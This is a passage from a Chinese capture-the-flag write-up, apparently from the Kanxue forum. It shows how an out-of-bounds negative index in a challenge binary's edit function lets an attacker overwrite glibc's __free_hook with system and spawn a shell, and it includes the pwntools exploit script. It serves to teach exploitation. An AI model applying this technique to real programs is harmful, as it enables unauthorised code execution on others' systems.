获取了`libc`基地址后，如何利用呢？继续向上寻址，发现`bss`段存在一个`a -> b -> a`的指针：

![image-20250807181630912](https://bbs.kanxue.com/upload/attach/202508/912098_2NUGCS69SCWZKPX.png)

我们可以继续利用`eidt()`函数的漏洞，修改`heap[-11]`位置指针指向的内容，将其改为`__free_hook`。

此时，`__dso_handle` -> `__free_hook`，我们再次修改`heap[-11]`位置指针指向的内容，即可修改`__free_hook`。

常规套路，我们修改`__free_hook`为`system`，然后调用`delete()`函数即可拿下`shell`。

## 脚本如下所示

```python
# 创建一个chunk存储/bin/sh
p.sendlineafter(b'5. Exit', b'1')
p.sendafter(b'Enter your username:', b'/bin/sh')

# __dso_handle -> __free_hook
p.sendlineafter(b'5. Exit', b'4')
p.sendlineafter(b'index:', b'-11')
p.sendafter(b'Enter a new username:', p64(libc.sym['__free_hook']))

# __free_hook -> system
p.sendlineafter(b'5. Exit', b'4')
p.sendlineafter(b'index:', b'-11')
p.sendafter(b'Enter a new username:', p64(libc.sym['system']))

# system("/bin/sh")
p.sendlineafter(b'5. Exit', b'2')
p.sendlineafter(b'index:', b'0')
```
